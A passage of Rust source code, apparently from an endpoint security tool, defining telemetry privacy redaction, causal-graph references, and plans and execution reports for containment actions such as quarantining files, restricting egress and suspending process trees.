            Self::RestrictEgress => "restrict_egress",
            Self::SuspendProcessTree => "suspend_process_tree",
            Self::TerminateProcessTree => "terminate_process_tree",
            Self::QuarantineFile => "quarantine_file",
            Self::RevokeGrant => "revoke_grant",
            Self::DisablePersistence => "disable_persistence",
            Self::CollectEvidence => "collect_evidence",
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EndpointEvidenceRedactionClass {
    #[default]
    HashOnly,
    MetadataOnly,
    Redacted,
    RawArtifactPermitted,
    LocalOnly,
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointReceiptEvidence {
    pub key: String,
    pub value_hash: String,
    pub redaction_class: EndpointEvidenceRedactionClass,
    pub raw_value: Option<String>,
}

impl Default for EndpointReceiptEvidence {
    fn default() -> Self {
        Self {
            key: String::new(),
            value_hash: String::new(),
            redaction_class: EndpointEvidenceRedactionClass::HashOnly,
            raw_value: None,
        }
    }
}

impl EndpointReceiptEvidence {
    #[must_use]
    pub fn hashed(key: impl Into<String>, value: impl AsRef<str>) -> Self {
        Self {
            key: key.into(),
            value_hash: sha256(value.as_ref().as_bytes()).to_hex_prefixed(),
            redaction_class: EndpointEvidenceRedactionClass::HashOnly,
            raw_value: None,
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EndpointTelemetryPrivacyMode {
    LocalOnly,
    #[default]
    HashesFeatures,
    SummaryWithReceipts,
    RawArtifactPermitted,
}

impl EndpointTelemetryPrivacyMode {
    #[must_use]
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::LocalOnly => "local_only",
            Self::HashesFeatures => "hashes_features",
            Self::SummaryWithReceipts => "summary_with_receipts",
            Self::RawArtifactPermitted => "raw_artifact_permitted",
        }
    }

    #[must_use]
    pub fn permits_raw_artifacts(&self) -> bool {
        matches!(self, Self::RawArtifactPermitted)
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointTelemetryFieldProjection {
    pub field_path: String,
    pub redaction_class: EndpointEvidenceRedactionClass,
    pub value_hash: Option<String>,
    pub feature_value: Option<String>,
    pub raw_value: Option<String>,
    pub reason: String,
}

impl Default for EndpointTelemetryFieldProjection {
    fn default() -> Self {
        Self {
            field_path: String::new(),
            redaction_class: EndpointEvidenceRedactionClass::HashOnly,
            value_hash: None,
            feature_value: None,
            raw_value: None,
            reason: String::new(),
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointTelemetryObservationProjection {
    pub observation_id: String,
    pub event_kind: String,
    pub field_count: usize,
    pub raw_suppressed_count: usize,
    pub local_only_count: usize,
    pub projections: Vec<EndpointTelemetryFieldProjection>,
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointTelemetryPrivacyReport {
    pub report_id: String,
    pub privacy_mode: EndpointTelemetryPrivacyMode,
    pub raw_artifact_upload_permitted: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub raw_artifact_approval_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub raw_artifact_approval_reason_hash: Option<String>,
    pub observation_count: usize,
    pub field_count: usize,
    pub hash_only_count: usize,
    pub metadata_only_count: usize,
    pub redacted_count: usize,
    pub raw_suppressed_count: usize,
    pub local_only_count: usize,
    pub observations: Vec<EndpointTelemetryObservationProjection>,
}

impl EndpointTelemetryPrivacyReport {
    #[must_use]
    pub fn from_observations(
        observations: &[EndpointObservation],
        privacy_mode: EndpointTelemetryPrivacyMode,
    ) -> Self {
        Self::from_observations_with_raw_artifact_approval(observations, privacy_mode, None, None)
    }

    #[must_use]
    pub fn from_observations_with_raw_artifact_approval(
        observations: &[EndpointObservation],
        privacy_mode: EndpointTelemetryPrivacyMode,
        raw_artifact_approval_id: Option<&str>,
        raw_artifact_approval_reason_hash: Option<&str>,
    ) -> Self {
        let raw_artifact_upload_permitted = privacy_mode.permits_raw_artifacts();
        let raw_artifact_approval_id = raw_artifact_upload_permitted
            .then(|| raw_artifact_approval_id.map(ToString::to_string))
            .flatten();
        let raw_artifact_approval_reason_hash = raw_artifact_upload_permitted
            .then(|| raw_artifact_approval_reason_hash.map(ToString::to_string))
            .flatten();
        let projected_observations = observations
            .iter()
            .map(|observation| project_observation_privacy(observation, &privacy_mode))
            .collect::<Vec<_>>();

        let field_count: usize = projected_observations
            .iter()
            .map(|projection| projection.field_count)
            .sum();
        let raw_suppressed_count: usize = projected_observations
            .iter()
            .map(|projection| projection.raw_suppressed_count)
            .sum();
        let local_only_count: usize = projected_observations
            .iter()
            .map(|projection| projection.local_only_count)
            .sum();
        let hash_only_count = count_projection_class(
            &projected_observations,
            EndpointEvidenceRedactionClass::HashOnly,
        );
        let metadata_only_count = count_projection_class(
            &projected_observations,
            EndpointEvidenceRedactionClass::MetadataOnly,
        );
        let redacted_count = count_projection_class(
            &projected_observations,
            EndpointEvidenceRedactionClass::Redacted,
        );
        let mode = privacy_mode.as_str();
        let observation_count_text = observations.len().to_string();
        let field_count_text = field_count.to_string();
        let hash_only_count_text = hash_only_count.to_string();
        let metadata_only_count_text = metadata_only_count.to_string();
        let redacted_count_text = redacted_count.to_string();
        let raw_suppressed_count_text = raw_suppressed_count.to_string();
        let local_only_count_text = local_only_count.to_string();
        let report_id = telemetry_privacy_report_id_from_values(
            mode,
            raw_artifact_upload_permitted,
            raw_artifact_approval_id.as_deref(),
            raw_artifact_approval_reason_hash.as_deref(),
            [
                observation_count_text.as_str(),
                field_count_text.as_str(),
                hash_only_count_text.as_str(),
                metadata_only_count_text.as_str(),
                redacted_count_text.as_str(),
                raw_suppressed_count_text.as_str(),
                local_only_count_text.as_str(),
            ],
        );

        Self {
            report_id,
            privacy_mode,
            raw_artifact_upload_permitted,
            raw_artifact_approval_id,
            raw_artifact_approval_reason_hash,
            observation_count: observations.len(),
            field_count,
            hash_only_count,
            metadata_only_count,
            redacted_count,
            raw_suppressed_count,
            local_only_count,
            observations: projected_observations,
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointGraphReference {
    pub graph_slice_id: Option<String>,
    pub process_stable_key: Option<String>,
    pub process_node_id: Option<String>,
    pub parent_process_guid: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub content_hash: Option<String>,
    pub node_ids: Vec<String>,
    pub edge_ids: Vec<String>,
}

impl EndpointGraphReference {
    #[must_use]
    pub fn for_observation(observation: &EndpointObservation, graph: &CausalGraph) -> Self {
        let process_stable_key = observation.process.stable_key();
        let process_node_id = stable_id("node", [process_stable_key.as_str()]);
        let mut node_ids = BTreeSet::new();
        if graph.nodes.contains_key(&process_node_id) {
            node_ids.insert(process_node_id.clone());
        }

        let mut edge_ids = Vec::new();
        for edge in graph
            .edges
            .iter()
            .filter(|edge| edge.observation_id == observation.observation_id)
        {
            edge_ids.push(edge.edge_id.clone());
            node_ids.insert(edge.from.clone());
            node_ids.insert(edge.to.clone());
        }

        let node_count = node_ids.len().to_string();
        let edge_count = edge_ids.len().to_string();
        let graph_slice_id = stable_id(
            "graph_slice",
            [
                observation.observation_id.as_str(),
                process_node_id.as_str(),
                node_count.as_str(),
                edge_count.as_str(),
            ],
        );

        Self {
            graph_slice_id: Some(graph_slice_id),
            process_stable_key: Some(process_stable_key),
            process_node_id: Some(process_node_id),
            parent_process_guid: observation.process.parent_process_guid.clone(),
            content_hash: None,
            node_ids: node_ids.into_iter().collect(),
            edge_ids,
        }
    }

    #[must_use]
    pub fn for_subgraph(root_node_id: impl Into<String>, graph: &CausalGraph) -> Self {
        let root_node_id = root_node_id.into();
        let mut node_ids: Vec<String> = graph.nodes.keys().cloned().collect();
        node_ids.sort();
        let edge_ids: Vec<String> = graph
            .edges
            .iter()
            .map(|edge| edge.edge_id.clone())
            .collect();
        let node_count = node_ids.len().to_string();
        let edge_count = edge_ids.len().to_string();
        let graph_slice_id = stable_id(
            "graph_slice",
            [
                root_node_id.as_str(),
                node_count.as_str(),
                edge_count.as_str(),
            ],
        );

        Self {
            graph_slice_id: Some(graph_slice_id),
            process_stable_key: None,
            process_node_id: Some(root_node_id),
            parent_process_guid: None,
            content_hash: canonical_graph_content_hash(graph),
            node_ids,
            edge_ids,
        }
    }
}

fn canonical_graph_content_hash(graph: &CausalGraph) -> Option<String> {
    serde_json::to_value(graph)
        .ok()
        .and_then(|value| canonicalize_json(&value).ok())
        .map(|canonical_graph| sha256(canonical_graph.as_bytes()).to_hex_prefixed())
}

fn endpoint_sensor_state_content_hash(sensor_state: &EndpointSensorState) -> String {
    let value = serde_json::to_value(sensor_state).unwrap_or(serde_json::Value::Null);
    let canonical = canonicalize_json(&value).unwrap_or_else(|_| "null".to_string());
    sha256(canonical.as_bytes()).to_hex_prefixed()
}

fn endpoint_observation_content_hash(observation: &EndpointObservation) -> String {
    let value = serde_json::to_value(observation).unwrap_or(serde_json::Value::Null);
    let canonical = canonicalize_json(&value).unwrap_or_else(|_| "null".to_string());
    sha256(canonical.as_bytes()).to_hex_prefixed()
}

fn endpoint_decision_actor_content_hash(actor: &EndpointDecisionActor) -> String {
    let value = serde_json::to_value(actor).unwrap_or(serde_json::Value::Null);
    let canonical = canonicalize_json(&value).unwrap_or_else(|_| "null".to_string());
    sha256(canonical.as_bytes()).to_hex_prefixed()
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointResponsePlan {
    pub action_id: String,
    pub action: EndpointDecisionAction,
    pub dry_run: bool,
    pub root_node_id: String,
    pub graph_slice_id: String,
    pub ttl_seconds: u64,
    pub rollback_ref: String,
    pub reason: String,
    pub created_at: DateTime<Utc>,
    pub expires_at: DateTime<Utc>,
    pub node_count: usize,
    pub edge_count: usize,
}

impl Default for EndpointResponsePlan {
    fn default() -> Self {
        let created_at = Utc::now();
        Self {
            action_id: String::new(),
            action: EndpointDecisionAction::CollectEvidence,
            dry_run: true,
            root_node_id: String::new(),
            graph_slice_id: String::new(),
            ttl_seconds: 0,
            rollback_ref: String::new(),
            reason: String::new(),
            created_at,
            expires_at: created_at,
            node_count: 0,
            edge_count: 0,
        }
    }
}

impl EndpointResponsePlan {
    #[must_use]
    pub fn dry_run(
        action: EndpointDecisionAction,
        root_node_id: impl Into<String>,
        graph: &CausalGraph,
        ttl_seconds: u64,
        reason: impl Into<String>,
    ) -> Self {
        Self::new(action, true, root_node_id, graph, ttl_seconds, reason)
    }

    #[must_use]
    pub fn collect_evidence_execution(
        root_node_id: impl Into<String>,
        graph: &CausalGraph,
        ttl_seconds: u64,
        reason: impl Into<String>,
    ) -> Self {
        Self::new(
            EndpointDecisionAction::CollectEvidence,
            false,
            root_node_id,
            graph,
            ttl_seconds,
            reason,
        )
    }

    #[must_use]
    pub fn restrict_egress_execution(
        root_node_id: impl Into<String>,
        graph: &CausalGraph,
        ttl_seconds: u64,
        reason: impl Into<String>,
    ) -> Self {
        Self::new(
            EndpointDecisionAction::RestrictEgress,
            false,
            root_node_id,
            graph,
            ttl_seconds,
            reason,
        )
    }

    #[must_use]
    pub fn quarantine_file_execution(
        root_node_id: impl Into<String>,
        graph: &CausalGraph,
        ttl_seconds: u64,
        reason: impl Into<String>,
    ) -> Self {
        Self::new(
            EndpointDecisionAction::QuarantineFile,
            false,
            root_node_id,
            graph,
            ttl_seconds,
            reason,
        )
    }

    #[must_use]
    pub fn disable_persistence_execution(
        root_node_id: impl Into<String>,
        graph: &CausalGraph,
        ttl_seconds: u64,
        reason: impl Into<String>,
    ) -> Self {
        Self::new(
            EndpointDecisionAction::DisablePersistence,
            false,
            root_node_id,
            graph,
            ttl_seconds,
            reason,
        )
    }

    #[must_use]
    pub fn revoke_grant_execution(
        root_node_id: impl Into<String>,
        graph: &CausalGraph,
        ttl_seconds: u64,
        reason: impl Into<String>,
    ) -> Self {
        Self::new(
            EndpointDecisionAction::RevokeGrant,
            false,
            root_node_id,
            graph,
            ttl_seconds,
            reason,
        )
    }

    #[must_use]
    pub fn suspend_process_tree_execution(
        root_node_id: impl Into<String>,
        graph: &CausalGraph,
        ttl_seconds: u64,
        reason: impl Into<String>,
    ) -> Self {
        Self::new(
            EndpointDecisionAction::SuspendProcessTree,
            false,
            root_node_id,
            graph,
            ttl_seconds,
            reason,
        )
    }

    #[must_use]
    #[deprecated(
        note = "terminate_process_tree is dry-run/modeling only; use EndpointResponsePlan::dry_run or suspend_process_tree_execution for live response plans"
    )]
    pub fn terminate_process_tree_execution(
        root_node_id: impl Into<String>,
        graph: &CausalGraph,
        ttl_seconds: u64,
        reason: impl Into<String>,
    ) -> Self {
        Self::new(
            EndpointDecisionAction::TerminateProcessTree,
            false,
            root_node_id,
            graph,
            ttl_seconds,
            reason,
        )
    }

    fn new(
        action: EndpointDecisionAction,
        dry_run: bool,
        root_node_id: impl Into<String>,
        graph: &CausalGraph,
        ttl_seconds: u64,
        reason: impl Into<String>,
    ) -> Self {
        let root_node_id = root_node_id.into();
        let graph_ref = EndpointGraphReference::for_subgraph(root_node_id.clone(), graph);
        let graph_slice_id = graph_ref.graph_slice_id.unwrap_or_else(|| {
            let node_count = graph.nodes.len().to_string();
            let edge_count = graph.edges.len().to_string();
            stable_id(
                "graph_slice",
                [
                    root_node_id.as_str(),
                    node_count.as_str(),
                    edge_count.as_str(),
                ],
            )
        });
        let action_name = action.as_str();
        let ttl = ttl_seconds.to_string();
        let mode = if dry_run { "dry_run" } else { "execute" };
        let action_id = stable_id(
            "response_action",
            [
                root_node_id.as_str(),
                graph_slice_id.as_str(),
                action_name,
                mode,
                ttl.as_str(),
            ],
        );
        let rollback_ref = if !dry_run && action == EndpointDecisionAction::CollectEvidence {
            format!("rollback:noop:{action_id}")
        } else {
            format!("rollback:{action_id}")
        };
        let created_at = Utc::now();
        let expires_at = created_at + chrono::Duration::seconds(ttl_seconds as i64);

        Self {
            action_id,
            action,
            dry_run,
            root_node_id,
            graph_slice_id,
            ttl_seconds,
            rollback_ref,
            reason: reason.into(),
            created_at,
            expires_at,
            node_count: graph.nodes.len(),
            edge_count: graph.edges.len(),
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum EndpointResponseExecutionStatus {
    #[default]
    Succeeded,
    Failed,
    Partial,
    Expired,
    Cancelled,
    RolledBack,
}

impl EndpointResponseExecutionStatus {
    #[must_use]
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Succeeded => "succeeded",
            Self::Failed => "failed",
            Self::Partial => "partial",
            Self::Expired => "expired",
            Self::Cancelled => "cancelled",
            Self::RolledBack => "rolled_back",
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointEvidenceBundleReference {
    pub bundle_id: String,
    pub graph_slice_id: String,
    pub content_hash: String,
    pub node_count: usize,
    pub edge_count: usize,
    pub created_at: DateTime<Utc>,
}

impl Default for EndpointEvidenceBundleReference {
    fn default() -> Self {
        Self {
            bundle_id: String::new(),
            graph_slice_id: String::new(),
            content_hash: String::new(),
            node_count: 0,
            edge_count: 0,
            created_at: Utc::now(),
        }
    }
}

#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointResponseExecutionEffect {
    pub effect_id: String,
    pub effect_type: String,
    pub target: String,
    pub artifact: Option<String>,
    pub content_hash: Option<String>,
    pub byte_count: Option<u64>,
}

impl EndpointResponseExecutionEffect {
    #[must_use]
    pub fn quarantine_file(
        original_path: impl AsRef<str>,
        quarantine_path: impl AsRef<str>,
        content_hash: impl AsRef<str>,
        byte_count: u64,
    ) -> Self {
        let original_path = original_path.as_ref();
        let quarantine_path = quarantine_path.as_ref();
        let content_hash = content_hash.as_ref();
        let effect_id = stable_id(
            "response_effect_quarantine_file",
            [original_path, quarantine_path, content_hash],
        );
        Self {
            effect_id,
            effect_type: "quarantine_file".to_string(),
            target: original_path.to_string(),
            artifact: Some(quarantine_path.to_string()),
            content_hash: Some(content_hash.to_string()),
            byte_count: Some(byte_count),
        }
    }

    #[must_use]
    pub fn restore_quarantine_file(
        original_path: impl AsRef<str>,
        quarantine_path: impl AsRef<str>,
        content_hash: impl AsRef<str>,
        byte_count: u64,
    ) -> Self {
        let original_path = original_path.as_ref();
        let quarantine_path = quarantine_path.as_ref();
        let content_hash = content_hash.as_ref();
        let effect_id = stable_id(
            "response_effect_restore_quarantine_file",
            [original_path, quarantine_path, content_hash],
        );
        Self {
            effect_id,
            effect_type: "restore_quarantine_file".to_string(),
            target: original_path.to_string(),
            artifact: Some(quarantine_path.to_string()),
            content_hash: Some(content_hash.to_string()),
            byte_count: Some(byte_count),
        }
    }

    #[must_use]
    pub fn disable_persistence(
        original_path: impl AsRef<str>,
        disabled_path: impl AsRef<str>,
        content_hash: impl AsRef<str>,
        byte_count: u64,
    ) -> Self {
        let original_path = original_path.as_ref();
        let disabled_path = disabled_path.as_ref();
        let content_hash = content_hash.as_ref();
        let effect_id = stable_id(
            "response_effect_disable_persistence",
            [original_path, disabled_path, content_hash],
        );
        Self {
            effect_id,
            effect_type: "disable_persistence".to_string(),
            target: original_path.to_string(),
            artifact: Some(disabled_path.to_string()),
            content_hash: Some(content_hash.to_string()),
            byte_count: Some(byte_count),
        }
    }

    #[must_use]
    pub fn restore_persistence_file(
        original_path: impl AsRef<str>,
        disabled_path: impl AsRef<str>,
        content_hash: impl AsRef<str>,
        byte_count: u64,
    ) -> Self {
        let original_path = original_path.as_ref();
        let disabled_path = disabled_path.as_ref();
        let content_hash = content_hash.as_ref();
        let effect_id = stable_id(
            "response_effect_restore_persistence_file",
            [original_path, disabled_path, content_hash],
        );
        Self {
            effect_id,
            effect_type: "restore_persistence_file".to_string(),
            target: original_path.to_string(),
            artifact: Some(disabled_path.to_string()),
            content_hash: Some(content_hash.to_string()),
            byte_count: Some(byte_count),
        }
    }

    #[must_use]
    pub fn revoke_grant(target: impl AsRef<str>, revoked_grant_hash: impl AsRef<str>) -> Self {
        let target = target.as_ref();
        let revoked_grant_hash = revoked_grant_hash.as_ref();
        let effect_id = stable_id("response_effect_revoke_grant", [target, revoked_grant_hash]);
        Self {
            effect_id,
            effect_type: "revoke_grant".to_string(),
            target: target.to_string(),
            artifact: None,
            content_hash: Some(revoked_grant_hash.to_string()),
            byte_count: None,
        }
    }

    #[must_use]
    pub fn restrict_egress(primary_target: impl AsRef<str>, targets: &[String]) -> Self {
        let primary_target = primary_target.as_ref();
        let mut targets = targets.to_vec();
        targets.sort();
        targets.dedup();
        let target_list = targets.join(",");
        let content_hash = sha256(target_list.as_bytes()).to_hex_prefixed();
        let target = format!("egress:{primary_target}");
        let effect_id = stable_id(
            "response_effect_restrict_egress",
            [target.as_str(), content_hash.as_str()],
        );
        Self {
            effect_id,
            effect_type: "restrict_egress".to_string(),
            target,
            artifact: Some(target_list),
            content_hash: Some(content_hash),
            byte_count: Some(targets.len() as u64),
        }
    }

    #[must_use]
    pub fn restore_egress(primary_target: impl AsRef<str>, targets: &[String]) -> Self {
        let primary_target = primary_target.as_ref();
        let mut targets = targets.to_vec();
        targets.sort();
        targets.dedup();
        let target_list = targets.join(",");
        let content_hash = sha256(target_list.as_bytes()).to_hex_prefixed();
        let target = format!("egress:{primary_target}");
        let effect_id = stable_id(
            "response_effect_restore_egress",
            [target.as_str(), content_hash.as_str()],
        );
        Self {
            effect_id,
            effect_type: "restore_egress".to_string(),
            target,
            artifact: Some(target_list),
            content_hash: Some(content_hash),
            byte_count: Some(targets.len() as u64),
        }
    }

    #[must_use]
    pub fn suspend_process_tree(root_pid: u32, pids: &[u32]) -> Self {
        let mut pids = pids.to_vec();
        pids.sort_unstable();
        pids.dedup();
        let pid_list = pids
            .iter()
            .map(u32::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let content_hash = sha256(pid_list.as_bytes()).to_hex_prefixed();
        let target = format!("pid:{root_pid}");
        let effect_id = stable_id(
            "response_effect_suspend_process_tree",
            [target.as_str(), content_hash.as_str()],
        );
        Self {
            effect_id,
            effect_type: "suspend_process_tree".to_string(),
            target,
            artifact: Some(pid_list),
            content_hash: Some(content_hash),
            byte_count: Some(pids.len() as u64),
        }
    }

    #[must_use]
    pub fn resume_process_tree(root_pid: u32, pids: &[u32]) -> Self {
        let mut pids = pids.to_vec();
        pids.sort_unstable();
        pids.dedup();
        let pid_list = pids
            .iter()
            .map(u32::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let content_hash = sha256(pid_list.as_bytes()).to_hex_prefixed();
        let target = format!("pid:{root_pid}");
        let effect_id = stable_id(
            "response_effect_resume_process_tree",
            [target.as_str(), content_hash.as_str()],
        );
        Self {
            effect_id,
            effect_type: "resume_process_tree".to_string(),
            target,
            artifact: Some(pid_list),
            content_hash: Some(content_hash),
            byte_count: Some(pids.len() as u64),
        }
    }

    #[must_use]
    pub fn terminate_process_tree(root_pid: u32, pids: &[u32]) -> Self {
        let mut pids = pids.to_vec();
        pids.sort_unstable();
        pids.dedup();
        let pid_list = pids
            .iter()
            .map(u32::to_string)
            .collect::<Vec<_>>()
            .join(",");
        let content_hash = sha256(pid_list.as_bytes()).to_hex_prefixed();
        let target = format!("pid:{root_pid}");
        let effect_id = stable_id(
            "response_effect_terminate_process_tree",
            [target.as_str(), content_hash.as_str()],
        );
        Self {
            effect_id,
            effect_type: "terminate_process_tree".to_string(),
            target,
            artifact: Some(pid_list),
            content_hash: Some(content_hash),
            byte_count: Some(pids.len() as u64),
        }
    }
}

#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(default, rename_all = "camelCase", deny_unknown_fields)]
pub struct EndpointResponseExecutionReport {
    pub execution_id: String,
    pub action_id: String,
    pub action: EndpointDecisionAction,
    pub status: EndpointResponseExecutionStatus,
    pub dry_run: bool,
    pub root_node_id: String,
    pub graph_slice_id: String,
    pub ttl_seconds: u64,
    pub rollback_ref: String,
    pub reason: String,
    pub started_at: DateTime<Utc>,
    pub completed_at: DateTime<Utc>,
    pub evidence_bundle: EndpointEvidenceBundleReference,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub actor: Option<EndpointDecisionActor>,
    #[serde(default)]
    pub effects: Vec<EndpointResponseExecutionEffect>,
    pub summary: String,
}

impl Default for EndpointResponseExecutionReport {
    fn default() -> Self {
        let now = Utc::now();
        Self {
            execution_id: String::new(),
            action_id: String::new(),
            action: EndpointDecisionAction::CollectEvidence,
            status: EndpointResponseExecutionStatus::Succeeded,
            dry_run: false,
            root_node_id: String::new(),
            graph_slice_id: String::new(),
            ttl_seconds: 0,
            rollback_ref: String::new(),
            reason: String::new(),
            started_at: now,
            completed_at: now,
            evidence_bundle: EndpointEvidenceBundleReference::default(),
            actor: None,
            effects: Vec::new(),
            summary: String::new(),
        }
    }
}

impl EndpointResponseExecutionReport {
    pub fn collect_evidence(plan: &EndpointResponsePlan, graph: &CausalGraph) -> Result<Self> {
        if plan.action != EndpointDecisionAction::CollectEvidence {
            return Err(anyhow!(
                "collect evidence execution report requires collect_evidence action"
            ));
        }
        if plan.dry_run {
            return Err(anyhow!(
                "collect evidence execution report requires a non-dry-run plan"
            ));
        }

        let graph_value = serde_json::to_value(graph).context("serialize evidence graph slice")?;
        let canonical_graph =
            canonicalize_json(&graph_value).context("canonicalize evidence graph slice")?;
        let content_hash = sha256(canonical_graph.as_bytes()).to_hex_prefixed();
        let evidence_bundle_id = stable_id(
            "evidence_bundle",
            [
                plan.action_id.as_str(),
                plan.graph_slice_id.as_str(),
                content_hash.as_str(),
            ],
        );
        let execution_id = stable_id(
            "response_execution",
            [
                plan.action_id.as_str(),
                evidence_bundle_id.as_str(),
                content_hash.as_str(),
            ],
        );
        let started_at = Utc::now();
        let completed_at = started_at;
        let evidence_bundle = EndpointEvidenceBundleReference {
            bundle_id: evidence_bundle_id,
            graph_slice_id: plan.graph_slice_id.clone(),
            content_hash,
            node_count: graph.nodes.len(),
            edge_count: graph.edges.len(),
            created_at: completed_at,
        };
        let summary = format!(
            "Collected endpoint evidence graph slice {} with {} nodes and {} edges.",
            plan.graph_slice_id, evidence_bundle.node_count, evidence_bundle.edge_count
        );

        Ok(Self {
            execution_id,
            action_id: plan.action_id.clone(),
            action: plan.action.clone(),
            status: EndpointResponseExecutionStatus::Succeeded,
            dry_run: false,
            root_node_id: plan.root_node_id.clone(),
            graph_slice_id: plan.graph_slice_id.clone(),
            ttl_seconds: plan.ttl_seconds,
            rollback_ref: plan.rollback_ref.clone(),
            reason: plan.reason.clone(),
            started_at,
            completed_at,
            evidence_bundle,
            actor: None,
            effects: Vec::new(),
            summary,
        })
    }

    pub fn failed(
        plan: &EndpointResponsePlan,
        graph: &CausalGraph,
        failure: impl AsRef<str>,
    ) -> Result<Self> {
        if plan.dry_run {
            return Err(anyhow!(
                "failed execution report requires a non-dry-run plan"
            ));
        }
        let failure = failure.as_ref().trim();
        if failure.is_empty() {
            return Err(anyhow!("failed execution report requires a failure reason"));
        }

        let graph_value = serde_json::to_value(graph).context("serialize failed response graph")?;
        let canonical_graph =
            canonicalize_json(&graph_value).context("canonicalize failed response graph")?;
        let content_hash = sha256(canonical_graph.as_bytes()).to_hex_prefixed();
        let reason = format!("{}; failure: {failure}", plan.reason);
        let reason_hash = sha256(reason.as_bytes()).to_hex_prefixed();
        let evidence_bundle_id = stable_id(
            "evidence_bundle",
            [
                plan.action_id.as_str(),
                plan.graph_slice_id.as_str(),
                content_hash.as_str(),
                "failed",
            ],
        );
        let execution_id = response_execution_transition_id_from_reason_hash(
            "response_execution_failed",
            plan.action_id.as_str(),
            evidence_bundle_id.as_str(),
            plan.rollback_ref.as_str(),
            reason_hash.as_str(),
        );
        let completed_at = Utc::now();
        let evidence_bundle = EndpointEvidenceBundleReference {
            bundle_id: evidence_bundle_id,
            graph_slice_id: plan.graph_slice_id.clone(),
            content_hash,
            node_count: graph.nodes.len(),
            edge_count: graph.edges.len(),
            created_at: completed_at,
        };

        Ok(Self {
            execution_id,
            action_id: plan.action_id.clone(),
            action: plan.action.clone(),
            status: EndpointResponseExecutionStatus::Failed,
            dry_run: false,
            root_node_id: plan.root_node_id.clone(),
            graph_slice_id: plan.graph_slice_id.clone(),
            ttl_seconds: plan.ttl_seconds,
            rollback_ref: plan.rollback_ref.clone(),
            reason,
            started_at: completed_at,
            completed_at,
            evidence_bundle,
            actor: None,
            effects: Vec::new(),
            summary: format!(
                "Endpoint response action {} failed before local effects: {failure}",
                plan.action.as_str()
            ),
        })
    }

    pub fn restrict_egress(
        plan: &EndpointResponsePlan,
        graph: &CausalGraph,
        targets: &[String],
    ) -> Result<Self> {
        if plan.action != EndpointDecisionAction::RestrictEgress {
            return Err(anyhow!(
                "restrict egress execution report requires restrict_egress action"
            ));
        }
        if plan.dry_run {
            return Err(anyhow!(
                "restrict egress execution report requires a non-dry-run plan"
            ));
        }
        let primary_target = targets
            .first()
            .ok_or_else(|| anyhow!("restrict egress execution report requires a target"))?;

        let graph_value =
            serde_json::to_value(graph).context("serialize egress restriction graph slice")?;
        let canonical_graph = canonicalize_json(&graph_value)
            .context("canonicalize egress restriction graph slice")?;
        let graph_content_hash = sha256(canonical_graph.as_bytes()).to_hex_prefixed();
        let effect = EndpointResponseExecutionEffect::restrict_egress(primary_target, targets);
        let evidence_bundle_id = stable_id(
            "evidence_bundle",
            [
                plan.action_id.as_str(),
                plan.graph_slice_id.as_str(),
                graph_content_hash.as_str(),
            ],
        );
        let execution_id = response_execution_id_from_effects(
            plan.action_id.as_str(),
            evidence_bundle_id.as_str(),
            std::slice::from_ref(&effect),
        )?;
        let completed_at = Utc::now();
        let evidence_bundle = EndpointEvidenceBundleReference {
            bundle_id: evidence_bundle_id,
            graph_slice_id: plan.graph_slice_id.clone(),
            content_hash: graph_content_hash,
            node_count: graph.nodes.len(),
            edge_count: graph.edges.len(),
            created_at: completed_at,
        };
        let target_count = effect.byte_count.unwrap_or(0);
        let summary = format!(
            "Restricted local egress to {target_count} network targets from graph slice {}.",
            plan.graph_slice_id
        );

        Ok(Self {
            execution_id,
            action_id: plan.action_id.clone(),
            action: plan.action.clone(),
            status: EndpointResponseExecutionStatus::Succeeded,
            dry_run: false,
            root_node_id: plan.root_node_id.clone(),
            graph_slice_id: plan.graph_slice_id.clone(),
            ttl_seconds: plan.ttl_seconds,
            rollback_ref: plan.rollback_ref.clone(),
            reason: plan.reason.clone(),
            started_at: completed_at,
            completed_at,
            evidence_bundle,
            actor: None,
            effects: vec![effect],
            summary,
        })
    }

    pub fn quarantine_file(
        plan: &EndpointResponsePlan,
        graph: &CausalGraph,
        original_path: impl AsRef<str>,
        quarantine_path: impl AsRef<str>,
        content_hash: impl AsRef<str>,
        byte_count: u64,
    ) -> Result<Self> {
        if plan.action != EndpointDecisionAction::QuarantineFile {
            return Err(anyhow!(
                "quarantine file execution report requires quarantine_file action"
            ));
        }
        if plan.dry_run {
            return Err(anyhow!(
                "quarantine file execution report requires a non-dry-run plan"
            ));
        }

        let original_path = original_path.as_ref();
        let quarantine_path = quarantine_path.as_ref();
        let content_hash = content_hash.as_ref();
        let graph_value =
